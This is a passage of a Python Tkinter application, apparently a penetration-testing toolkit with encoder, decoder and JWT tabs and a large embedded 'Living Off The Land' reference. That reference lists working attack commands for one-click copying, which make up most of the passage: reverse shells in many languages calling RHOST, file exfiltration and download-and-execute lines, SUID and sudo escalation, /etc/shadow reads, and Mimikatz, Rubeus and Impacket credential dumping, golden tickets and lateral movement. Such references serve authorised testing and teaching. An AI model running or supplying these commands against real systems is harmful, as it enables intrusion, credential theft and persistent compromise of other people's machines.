            relief=tk.FLAT,
            padx=15,
            pady=8,
            cursor="hand2",
            command=lambda: self.copy_to_clipboard(self.encoder_output.get("1.0", tk.END))
        )
        copy_btn.grid(row=7, column=0, columnspan=2, pady=10)

        return frame

    def encode_text(self):
        """Encode text based on selected encoding type."""
        import base64
        import hashlib
        import urllib.parse
        import html
        import codecs

        text = self.encoder_input.get("1.0", tk.END).strip()
        enc_type = self.encoder_type.get()

        if not text:
            messagebox.showerror("Error", "Please enter text to encode")
            return

        try:
            if enc_type == "Base64":
                result = base64.b64encode(text.encode()).decode()
            elif enc_type == "URL Encode":
                result = urllib.parse.quote(text)
            elif enc_type == "HTML Entities":
                result = html.escape(text)
            elif enc_type == "Hex":
                result = text.encode().hex()
            elif enc_type == "Binary":
                result = ' '.join(format(ord(c), '08b') for c in text)
            elif enc_type == "ROT13":
                result = codecs.encode(text, 'rot_13')
            elif enc_type == "Unicode":
                result = ''.join(f'\\u{ord(c):04x}' for c in text)
            elif enc_type == "ASCII to Decimal":
                result = ' '.join(str(ord(c)) for c in text)
            elif enc_type == "MD5 Hash":
                result = hashlib.md5(text.encode()).hexdigest()
            elif enc_type == "SHA1 Hash":
                result = hashlib.sha1(text.encode()).hexdigest()
            elif enc_type == "SHA256 Hash":
                result = hashlib.sha256(text.encode()).hexdigest()
            else:
                result = text

            self.encoder_output.delete("1.0", tk.END)
            self.encoder_output.insert("1.0", result)
        except Exception as e:
            messagebox.showerror("Encoding Error", str(e))

    def create_decoders_tab(self):
        """Create the Decoders tab for decoding data."""
        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
        frame.columnconfigure(1, weight=1)

        # Header
        header = tk.Label(
            frame,
            text="🔓 DECODERS",
            font=("Courier", 14, "bold"),
            fg=self.accent_cyan,
            bg=self.bg_secondary
        )
        header.grid(row=0, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=15)

        # Decoding type
        label = tk.Label(frame, text="Decoding Type:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=1, column=0, sticky=tk.W, padx=10, pady=5)

        self.decoder_type = ttk.Combobox(frame, values=[
            "Base64",
            "URL Decode",
            "HTML Entities",
            "Hex",
            "Binary",
            "ROT13",
            "Unicode",
            "Decimal to ASCII",
            "JWT Decode"
        ], font=("Courier", 10), state="readonly", width=25)
        self.decoder_type.grid(row=1, column=1, sticky=tk.W, padx=10, pady=5)
        self.decoder_type.current(0)

        # Input
        input_label = tk.Label(frame, text="Encoded Input:", font=("Courier", 10, "bold"),
                              fg=self.accent_cyan, bg=self.bg_secondary)
        input_label.grid(row=2, column=0, columnspan=2, sticky=tk.W, padx=10, pady=(10, 5))

        self.decoder_input = scrolledtext.ScrolledText(
            frame, height=5, font=("Consolas", 11),
            bg="#1E1E1E", fg=self.text_color,
            insertbackground=self.accent_green,
            selectbackground=self.accent_yellow,
            wrap=tk.WORD, relief=tk.FLAT
        )
        self.decoder_input.grid(row=3, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=5)

        # Decode button
        decode_btn = tk.Button(
            frame,
            text="⚡ DECODE",
            font=("Courier", 11, "bold"),
            bg=self.accent_green,
            fg=self.bg_primary,
            activebackground=self.accent_cyan,
            relief=tk.FLAT,
            padx=20,
            pady=10,
            cursor="hand2",
            command=self.decode_text
        )
        decode_btn.grid(row=4, column=0, columnspan=2, padx=10, pady=15)

        # Output
        output_label = tk.Label(frame, text="Decoded Output:", font=("Courier", 10, "bold"),
                               fg=self.accent_cyan, bg=self.bg_secondary)
        output_label.grid(row=5, column=0, columnspan=2, sticky=tk.W, padx=10, pady=(10, 5))

        self.decoder_output = scrolledtext.ScrolledText(
            frame, height=5, font=("Consolas", 11),
            bg="#1E1E1E", fg=self.accent_green,
            insertbackground=self.accent_green,
            selectbackground=self.accent_yellow,
            wrap=tk.WORD, relief=tk.FLAT
        )
        self.decoder_output.grid(row=6, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=5)

        # Copy button
        copy_btn = tk.Button(
            frame,
            text="📋 COPY TO CLIPBOARD",
            font=("Courier", 9, "bold"),
            bg=self.bg_tertiary,
            fg=self.accent_cyan,
            activebackground=self.accent_cyan,
            activeforeground=self.bg_primary,
            relief=tk.FLAT,
            padx=15,
            pady=8,
            cursor="hand2",
            command=lambda: self.copy_to_clipboard(self.decoder_output.get("1.0", tk.END))
        )
        copy_btn.grid(row=7, column=0, columnspan=2, pady=10)

        return frame

    def decode_text(self):
        """Decode text based on selected decoding type."""
        import base64
        import urllib.parse
        import html
        import codecs

        text = self.decoder_input.get("1.0", tk.END).strip()
        dec_type = self.decoder_type.get()

        if not text:
            messagebox.showerror("Error", "Please enter text to decode")
            return

        try:
            if dec_type == "Base64":
                result = base64.b64decode(text).decode()
            elif dec_type == "URL Decode":
                result = urllib.parse.unquote(text)
            elif dec_type == "HTML Entities":
                result = html.unescape(text)
            elif dec_type == "Hex":
                result = bytes.fromhex(text).decode()
            elif dec_type == "Binary":
                binary_values = text.split()
                result = ''.join(chr(int(b, 2)) for b in binary_values)
            elif dec_type == "ROT13":
                result = codecs.decode(text, 'rot_13')
            elif dec_type == "Unicode":
                result = text.encode().decode('unicode_escape')
            elif dec_type == "Decimal to ASCII":
                decimal_values = text.split()
                result = ''.join(chr(int(d)) for d in decimal_values)
            elif dec_type == "JWT Decode":
                result = self.decode_jwt(text)
            else:
                result = text

            self.decoder_output.delete("1.0", tk.END)
            self.decoder_output.insert("1.0", result)
        except Exception as e:
            messagebox.showerror("Decoding Error", str(e))

    def decode_jwt(self, token):
        """Decode a JWT token."""
        import base64
        import json

        parts = token.split('.')
        if len(parts) != 3:
            return "Invalid JWT format"

        def decode_part(part):
            padding = 4 - len(part) % 4
            part += '=' * padding
            return base64.urlsafe_b64decode(part).decode()

        header = json.loads(decode_part(parts[0]))
        payload = json.loads(decode_part(parts[1]))

        return f"HEADER:\n{json.dumps(header, indent=2)}\n\nPAYLOAD:\n{json.dumps(payload, indent=2)}"

    def create_lolol_tab(self):
        """Create the LOLOL tab for Living Off The Land binaries reference."""
        frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
        frame.columnconfigure(1, weight=1)
        frame.rowconfigure(5, weight=1)

        # Header
        header = tk.Label(
            frame,
            text="🎭 LOLOL - Living Off The Land",
            font=("Courier", 14, "bold"),
            fg=self.accent_cyan,
            bg=self.bg_secondary
        )
        header.grid(row=0, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=10)

        desc = tk.Label(
            frame,
            text="GTFOBins (Linux) • LOLBAS (Windows) • LOLAD (Active Directory)",
            font=("Courier", 9),
            fg=self.text_color,
            bg=self.bg_secondary
        )
        desc.grid(row=1, column=0, columnspan=2, padx=10, pady=(0, 10))

        # Category selection
        label = tk.Label(frame, text="Category:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=2, column=0, sticky=tk.W, padx=10, pady=5)

        self.lolol_category = ttk.Combobox(frame, values=[
            "🐧 GTFOBins (Linux)",
            "🪟 LOLBAS (Windows)",
            "🏢 LOLAD (Active Directory)"
        ], font=("Courier", 10), state="readonly", width=28)
        self.lolol_category.grid(row=2, column=1, sticky=tk.W, padx=10, pady=5)
        self.lolol_category.current(0)
        self.lolol_category.bind("<<ComboboxSelected>>", self.on_lolol_category_changed)

        # Binary/Technique selection
        label = tk.Label(frame, text="Binary/Technique:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=3, column=0, sticky=tk.W, padx=10, pady=5)

        self.lolol_binary = ttk.Combobox(frame, font=("Courier", 10), state="readonly", width=28)
        self.lolol_binary.grid(row=3, column=1, sticky=tk.W, padx=10, pady=5)
        self.lolol_binary.bind("<<ComboboxSelected>>", lambda e: self.show_lolol_info())

        # Function type
        label = tk.Label(frame, text="Function:", font=("Courier", 10),
                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
        label.grid(row=4, column=0, sticky=tk.W, padx=10, pady=5)

        self.lolol_function = ttk.Combobox(frame, font=("Courier", 10), state="readonly", width=28)
        self.lolol_function.grid(row=4, column=1, sticky=tk.W, padx=10, pady=5)
        self.lolol_function.bind("<<ComboboxSelected>>", lambda e: self.show_lolol_info())

        # Info display
        self.lolol_output = scrolledtext.ScrolledText(
            frame, height=12, font=("Consolas", 11),
            bg="#1E1E1E", fg=self.accent_green,
            insertbackground=self.accent_green,
            selectbackground=self.accent_yellow,
            wrap=tk.WORD, relief=tk.FLAT
        )
        self.lolol_output.grid(row=5, column=0, columnspan=2, sticky=tk.NSEW, padx=10, pady=10)

        # Initialize category data
        self.init_lolol_data()
        self.on_lolol_category_changed(None)

        # Copy button
        copy_btn = tk.Button(
            frame,
            text="📋 COPY TO CLIPBOARD",
            font=("Courier", 9, "bold"),
            bg=self.bg_tertiary,
            fg=self.accent_cyan,
            activebackground=self.accent_cyan,
            activeforeground=self.bg_primary,
            relief=tk.FLAT,
            padx=15,
            pady=8,
            cursor="hand2",
            command=lambda: self.copy_to_clipboard(self.lolol_output.get("1.0", tk.END))
        )
        copy_btn.grid(row=6, column=0, columnspan=2, pady=10)

        return frame

    def init_lolol_data(self):
        """Initialize all LOLOL data for GTFOBins, LOLBAS, and LOLAD."""
        # GTFOBins data (Linux)
        self.gtfobins_data = {
            "awk": {
                "Shell": "awk 'BEGIN {system(\"/bin/sh\")}'",
                "File read": "awk '//' /path/to/file",
                "File write": "awk 'BEGIN {print \"content\" > \"/path/to/file\"}'",
                "SUID": "./awk 'BEGIN {system(\"/bin/sh\")}'",
                "Sudo": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
                "Reverse shell": "awk 'BEGIN {s=\"/inet/tcp/0/RHOST/RPORT\";while(42){printf \">\" |& s;s |& getline c;if(c){while((c |& getline) > 0)print $0 |& s;close(c)}}}' /dev/null"
            },
            "base64": {
                "File read": "base64 /path/to/file | base64 -d",
                "SUID": "./base64 /etc/shadow | base64 -d",
                "Sudo": "sudo base64 /etc/shadow | base64 -d"
            },
            "bash": {
                "Shell": "/bin/bash",
                "SUID": "./bash -p",
                "Sudo": "sudo bash",
                "Reverse shell": "bash -i >& /dev/tcp/RHOST/RPORT 0>&1"
            },
            "cat": {
                "File read": "cat /path/to/file",
                "SUID": "./cat /etc/shadow",
                "Sudo": "sudo cat /etc/shadow"
            },
            "chmod": {
                "SUID": "./chmod 6777 /bin/bash",
                "Sudo": "sudo chmod 6777 /bin/bash"
            },
            "cp": {
                "File write": "cp /path/from /path/to",
                "SUID": "./cp /bin/bash /tmp/bash; chmod +s /tmp/bash",
                "Sudo": "sudo cp /bin/bash /tmp/bash; sudo chmod +s /tmp/bash"
            },
            "curl": {
                "File read": "curl file:///path/to/file",
                "File upload": "curl -X POST -d @/path/to/file http://RHOST/",
                "File download": "curl http://RHOST/file -o /path/to/output"
            },
            "docker": {
                "Shell": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                "SUID": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                "Sudo": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
            },
            "env": {
                "Shell": "env /bin/sh",
                "SUID": "./env /bin/sh -p",
                "Sudo": "sudo env /bin/sh"
            },
            "find": {
                "Shell": "find . -exec /bin/sh \\; -quit",
                "SUID": "./find . -exec /bin/sh -p \\; -quit",
                "Sudo": "sudo find . -exec /bin/sh \\; -quit"
            },
            "ftp": {
                "Shell": "ftp\\n!/bin/sh",
                "File download": "ftp -o /path/to/output http://RHOST/file"
            },
            "gdb": {
                "Shell": "gdb -nx -ex '!sh' -ex quit",
                "SUID": "./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit",
                "Sudo": "sudo gdb -nx -ex '!sh' -ex quit"
            },
            "git": {
                "Shell": "git help config\\n!/bin/sh",
                "SUID": "./git help config\\n!/bin/sh",
                "Sudo": "sudo git -p help config\\n!/bin/sh"
            },
            "less": {
                "Shell": "less /etc/passwd\\n!/bin/sh",
                "File read": "less /path/to/file",
                "SUID": "./less /etc/passwd\\n!/bin/sh",
                "Sudo": "sudo less /etc/passwd\\n!/bin/sh"
            },
            "lua": {
                "Shell": "lua -e 'os.execute(\"/bin/sh\")'",
                "Sudo": "sudo lua -e 'os.execute(\"/bin/sh\")'",
                "Reverse shell": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('RHOST','RPORT');os.execute('/bin/sh -i <&3 >&3 2>&3');\""
            },
            "man": {
                "Shell": "man man\\n!/bin/sh",
                "Sudo": "sudo man man\\n!/bin/sh"
            },
            "more": {
                "Shell": "more /etc/passwd\\n!/bin/sh",
                "SUID": "./more /etc/passwd\\n!/bin/sh",
                "Sudo": "sudo more /etc/passwd\\n!/bin/sh"
            },
            "nano": {
                "Shell": "nano\\n^R^X\\nreset; sh 1>&0 2>&0",
                "Sudo": "sudo nano -s /bin/sh\\n/bin/sh\\n^T"
            },
            "nc": {
                "Reverse shell": "nc -e /bin/sh RHOST RPORT",
                "File upload": "nc -lvnp RPORT > file < /path/to/file",
                "File download": "nc RHOST RPORT < /path/to/file"
            },
            "nmap": {
                "Shell": "nmap --interactive\\n!sh",
                "SUID": "./nmap --interactive\\n!sh",
                "Sudo": "sudo nmap --interactive\\n!sh"
            },
            "node": {
                "Shell": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'",
                "Sudo": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'",
                "Reverse shell": "node -e '(function(){var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);var client=new net.Socket();client.connect(RPORT,\"RHOST\",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'"
            },
            "perl": {
                "Shell": "perl -e 'exec \"/bin/sh\";'",
                "SUID": "./perl -e 'exec \"/bin/sh\";'",
                "Sudo": "sudo perl -e 'exec \"/bin/sh\";'",
                "Reverse shell": "perl -e 'use Socket;$i=\"RHOST\";$p=RPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
            },
            "php": {
                "Shell": "php -r \"system('/bin/sh');\"",
                "Sudo": "sudo php -r \"system('/bin/sh');\"",
                "Reverse shell": "php -r '$sock=fsockopen(\"RHOST\",RPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            },
            "pip": {
                "Shell": "TF=$(mktemp -d)\\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\\npip install $TF",
                "Sudo": "TF=$(mktemp -d)\\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\\nsudo pip install $TF"
            },
            "python": {
                "Shell": "python -c 'import os; os.system(\"/bin/sh\")'",
                "SUID": "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
                "Sudo": "sudo python -c 'import os; os.system(\"/bin/sh\")'",
                "Reverse shell": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"RHOST\",RPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
            },
            "python3": {
                "Shell": "python3 -c 'import os; os.system(\"/bin/sh\")'",
                "SUID": "./python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
                "Sudo": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
                "Reverse shell": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"RHOST\",RPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
            },
            "rsync": {
                "Shell": "rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
                "Sudo": "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
            },
            "ruby": {
                "Shell": "ruby -e 'exec \"/bin/sh\"'",
                "Sudo": "sudo ruby -e 'exec \"/bin/sh\"'",
                "Reverse shell": "ruby -rsocket -e'f=TCPSocket.open(\"RHOST\",RPORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
            },
            "scp": {
                "File download": "scp user@RHOST:/path/to/file /local/path",
                "File upload": "scp /local/file user@RHOST:/remote/path"
            },
            "sed": {
                "File read": "sed '' /path/to/file",
                "SUID": "./sed '' /etc/shadow",
                "Sudo": "sudo sed '' /etc/shadow"
            },
            "socat": {
                "Shell": "socat stdin exec:/bin/sh",
                "Reverse shell": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:RHOST:RPORT",
                "File download": "socat -u TCP:RHOST:RPORT OPEN:/path/to/output,creat"
            },
            "ssh": {
                "Shell": "ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
                "Sudo": "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"
            },
            "strace": {
                "SUID": "./strace -o /dev/null /bin/sh -p",
                "Sudo": "sudo strace -o /dev/null /bin/sh"
            },
            "tar": {
                "Shell": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
                "SUID": "./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
                "Sudo": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
            },
            "tee": {
                "File write": "echo 'content' | tee /path/to/file",
                "SUID": "echo 'content' | ./tee /path/to/file",
                "Sudo": "echo 'content' | sudo tee /path/to/file"
            },
            "vim": {
                "Shell": "vim -c ':!/bin/sh'",
                "SUID": "./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
                "Sudo": "sudo vim -c ':!/bin/sh'"
            },
            "watch": {
                "Shell": "watch -x sh -c 'reset; exec sh 1>&0 2>&0'",
                "Sudo": "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
            },
            "wget": {
                "File download": "wget http://RHOST/file -O /path/to/output",
                "File upload": "wget --post-file=/path/to/file http://RHOST/"
            },
            "xxd": {
                "File read": "xxd /path/to/file | xxd -r",
                "SUID": "./xxd /etc/shadow | xxd -r",
                "Sudo": "sudo xxd /etc/shadow | xxd -r"
            },
            "zip": {
                "Shell": "TF=$(mktemp -u)\\nzip $TF /etc/hosts -T -TT 'sh #'\\nrm $TF",
                "Sudo": "TF=$(mktemp -u)\\nsudo zip $TF /etc/hosts -T -TT 'sh #'\\nsudo rm $TF"
            }
        }

        # LOLBAS data (Windows)
        self.lolbas_data = {
            "certutil.exe": {
                "Download": "certutil.exe -urlcache -split -f http://RHOST/file.exe output.exe",
                "Encode": "certutil.exe -encode input.txt output.txt",
                "Decode": "certutil.exe -decode input.txt output.exe",
                "ADS": "certutil.exe -urlcache -split -f http://RHOST/file.exe C:\\Temp:file.exe"
            },
            "mshta.exe": {
                "Execute": "mshta.exe http://RHOST/payload.hta",
                "Inline": "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass -c IEX(cmd)\"\", 0:close\")",
                "JavaScript": "mshta.exe \"javascript:a=new ActiveXObject('Wscript.Shell');a.Run('cmd /c calc');close();\""
            },
            "msiexec.exe": {
                "Execute": "msiexec /q /i http://RHOST/payload.msi",
                "DLL": "msiexec /y C:\\path\\to\\payload.dll"
            },
            "regsvr32.exe": {
                "Execute": "regsvr32 /s /n /u /i:http://RHOST/payload.sct scrobj.dll",
                "Local SCT": "regsvr32 /s /n /u /i:C:\\path\\payload.sct scrobj.dll"
            },
            "rundll32.exe": {
                "Execute": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"calc\")",
                "DLL": "rundll32.exe C:\\path\\to\\payload.dll,EntryPoint",
                "URL": "rundll32.exe url.dll,OpenURL http://RHOST/payload.hta"
            },
            "msbuild.exe": {
                "Execute": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe payload.xml",
                "Inline": "msbuild.exe /p:Configuration=Release payload.csproj"
            },
            "installutil.exe": {
                "Execute": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe"
            },
            "csc.exe": {
                "Compile": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:payload.exe payload.cs"
            },
            "powershell.exe": {
                "Download": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://RHOST/payload.ps1')\"",
                "Encoded": "powershell -EncodedCommand <base64>",
                "Bypass": "powershell -ExecutionPolicy Bypass -File payload.ps1",
                "Reverse shell": "powershell -NoP -NonI -W Hidden -Exec Bypass -c \"$client=New-Object System.Net.Sockets.TCPClient('RHOST',RPORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sb=(iex $data 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sb2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
            },
            "cmd.exe": {
                "Execute": "cmd.exe /c <command>",
                "Download": "cmd.exe /c certutil -urlcache -split -f http://RHOST/file.exe"
            },
            "wmic.exe": {
                "Execute": "wmic process call create \"cmd.exe /c <command>\"",
                "Remote": "wmic /node:TARGET process call create \"cmd.exe /c <command>\""
            },
            "cscript.exe": {
                "Execute": "cscript.exe //E:jscript C:\\path\\payload.txt",
                "VBS": "cscript.exe C:\\path\\payload.vbs"
            },
            "wscript.exe": {
                "Execute": "wscript.exe C:\\path\\payload.vbs",
                "JS": "wscript.exe C:\\path\\payload.js"
            },
            "bitsadmin.exe": {
                "Download": "bitsadmin /transfer job /download /priority high http://RHOST/payload.exe C:\\Temp\\payload.exe",
                "Execute": "bitsadmin /create 1 & bitsadmin /addfile 1 http://RHOST/payload.exe C:\\Temp\\payload.exe & bitsadmin /SETNOTIFYCMDLINE 1 C:\\Temp\\payload.exe NULL & bitsadmin /Resume 1"
            },
            "forfiles.exe": {
                "Execute": "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"cmd.exe /c calc.exe\""
            },
            "pcalua.exe": {
                "Execute": "pcalua.exe -a calc.exe",
                "DLL": "pcalua.exe -a C:\\path\\payload.dll"
            },
            "schtasks.exe": {
                "Execute": "schtasks /create /tn \"TaskName\" /tr \"C:\\path\\payload.exe\" /sc once /st 00:00",
                "Remote": "schtasks /create /s TARGET /tn \"TaskName\" /tr \"C:\\path\\payload.exe\" /sc once /st 00:00"
            },
            "at.exe": {
                "Execute": "at 00:00 /interactive cmd.exe"
            },
            "reg.exe": {
                "Persistence": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Payload /t REG_SZ /d \"C:\\path\\payload.exe\"",
                "Query": "reg query HKLM /s /f password"
            },
            "expand.exe": {
                "Copy ADS": "expand \\\\RHOST\\share\\file.exe C:\\Temp:file.exe"
            },
            "esentutl.exe": {
                "Copy ADS": "esentutl.exe /y \\\\RHOST\\share\\file.exe /d C:\\Temp\\file.exe /o"
            },
            "extrac32.exe": {
                "Copy": "extrac32.exe /Y /C \\\\RHOST\\share\\file.cab C:\\Temp\\file.exe"
            },
            "findstr.exe": {
                "Download": "findstr /V /L W3AllLov3DonaldTrump \\\\RHOST\\share\\file.exe > C:\\Temp\\file.exe"
            },
            "hh.exe": {
                "Execute": "hh.exe http://RHOST/payload.chm"
            },
            "ieexec.exe": {
                "Download": "ieexec.exe http://RHOST/payload.exe"
            },
            "makecab.exe": {
                "Compress": "makecab C:\\path\\file.exe C:\\Temp\\file.cab"
            },
            "replace.exe": {
                "Copy": "replace.exe \\\\RHOST\\share\\file.exe C:\\Temp /A"
            },
            "xwizard.exe": {
                "Execute": "xwizard.exe RunWizard {CLSID}"
            },
            "dnscmd.exe": {
                "DLL Load": "dnscmd.exe /config /serverlevelplugindll \\\\RHOST\\share\\payload.dll"
            },
            "fltMC.exe": {
                "UAC Bypass": "fltMC.exe"
            },
            "mavinject.exe": {
                "Inject": "mavinject.exe <PID> /INJECTRUNNING C:\\path\\payload.dll"
            },
            "syncappvpublishingserver.exe": {
                "Execute": "SyncAppvPublishingServer.exe \"n; Start-Process calc\""
            },
            "control.exe": {
                "DLL": "control.exe C:\\path\\payload.dll"
            },
            "cmstp.exe": {
                "UAC Bypass": "cmstp.exe /s C:\\path\\payload.inf"
            },
            "bash.exe": {
                "Execute": "bash.exe -c \"<command>\"",
                "Reverse shell": "bash.exe -c \"bash -i >& /dev/tcp/RHOST/RPORT 0>&1\""
            }
        }

        # LOLAD data (Active Directory)
        self.lolad_data = {
            "BloodHound/SharpHound": {
                "Collect All": "SharpHound.exe -c All",
                "Collect DCOnly": "SharpHound.exe -c DCOnly",
                "Stealth": "SharpHound.exe -c All --Stealth",
                "Loop": "SharpHound.exe -c Session --Loop"
            },
            "PowerView": {
                "Domain Info": "Get-NetDomain",
                "Domain Controllers": "Get-NetDomainController",
                "Domain Users": "Get-NetUser",
                "Domain Groups": "Get-NetGroup",
                "Domain Computers": "Get-NetComputer",
                "Group Members": "Get-NetGroupMember -GroupName \"Domain Admins\"",
                "Local Admins": "Find-LocalAdminAccess",
                "User Sessions": "Get-NetSession -ComputerName <target>",
                "ACL Abuse": "Find-InterestingDomainAcl"
            },
            "Mimikatz": {
                "Dump Hashes": "sekurlsa::logonpasswords",
                "DCSync": "lsadump::dcsync /domain:DOMAIN /user:Administrator",
                "Golden Ticket": "kerberos::golden /user:Administrator /domain:DOMAIN /sid:S-1-5-21-XXX /krbtgt:HASH /ptt",
                "Silver Ticket": "kerberos::golden /user:Administrator /domain:DOMAIN /sid:S-1-5-21-XXX /target:TARGET /service:SERVICE /rc4:HASH /ptt",
                "Pass-the-Hash": "sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH",
                "Pass-the-Ticket": "kerberos::ptt ticket.kirbi",
                "Skeleton Key": "misc::skeleton"
            },
            "Rubeus": {
                "Kerberoast": "Rubeus.exe kerberoast /outfile:hashes.txt",
                "AS-REP Roast": "Rubeus.exe asreproast /outfile:hashes.txt",
                "Request TGT": "Rubeus.exe asktgt /user:USER /password:PASS /domain:DOMAIN",
                "Request TGS": "Rubeus.exe asktgs /ticket:TGT /service:SERVICE/TARGET",
                "Pass-the-Ticket": "Rubeus.exe ptt /ticket:ticket.kirbi",
                "S4U": "Rubeus.exe s4u /user:USER /rc4:HASH /impersonateuser:TARGET /msdsspn:SERVICE/TARGET",
                "Dump Tickets": "Rubeus.exe dump"
            },
            "Impacket": {
                "Secretsdump": "secretsdump.py DOMAIN/USER:PASS@TARGET",
                "DCSync": "secretsdump.py -just-dc DOMAIN/USER:PASS@DC",
                "PSExec": "psexec.py DOMAIN/USER:PASS@TARGET",
                "WMIExec": "wmiexec.py DOMAIN/USER:PASS@TARGET",
                "SMBExec": "smbexec.py DOMAIN/USER:PASS@TARGET",
                "ATExec": "atexec.py DOMAIN/USER:PASS@TARGET",
                "GetUserSPNs": "GetUserSPNs.py -request DOMAIN/USER:PASS",
                "GetNPUsers": "GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat"
            },
            "CrackMapExec": {
                "SMB Enum": "crackmapexec smb TARGET -u USER -p PASS",
                "Pass-the-Hash": "crackmapexec smb TARGET -u USER -H HASH",
                "Dump SAM": "crackmapexec smb TARGET -u USER -p PASS --sam",
                "Dump LSA": "crackmapexec smb TARGET -u USER -p PASS --lsa",
                "Dump NTDS": "crackmapexec smb DC -u USER -p PASS --ntds",
                "Execute": "crackmapexec smb TARGET -u USER -p PASS -x \"command\"",
                "Spray": "crackmapexec smb TARGET -u users.txt -p PASS --continue-on-success"
            },
            "Lateral Movement": {
                "PsExec": "PsExec.exe \\\\TARGET -u DOMAIN\\USER -p PASS cmd.exe",
                "WinRM": "Enter-PSSession -ComputerName TARGET -Credential DOMAIN\\USER",
                "WMI": "wmic /node:TARGET process call create \"cmd.exe /c <command>\"",
                "DCOM": "Invoke-DCOM -ComputerName TARGET -Method MMC20.Application -Command \"cmd.exe /c <command>\"",
                "SCM": "sc \\\\TARGET create ServiceName binPath= \"cmd.exe /c <command>\"",
                "Remote Registry": "reg add \\\\TARGET\\HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Payload /t REG_SZ /d \"C:\\path\\payload.exe\"",
                "RDP": "mstsc /v:TARGET"
            },
            "Persistence": {
                "Golden Ticket": "kerberos::golden /user:Administrator /domain:DOMAIN /sid:S-1-5-21-XXX /krbtgt:HASH /ptt",
                "Silver Ticket": "kerberos::golden /user:USER /domain:DOMAIN /sid:S-1-5-21-XXX /target:TARGET /service:cifs /rc4:HASH",
                "Skeleton Key": "misc::skeleton (on DC - password: mimikatz)",
                "DCSync Rights": "Add-ObjectACL -TargetDistinguishedName 'DC=domain,DC=local' -PrincipalSamAccountName USER -Rights DCSync",
                "AdminSDHolder": "Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName USER -Rights All",
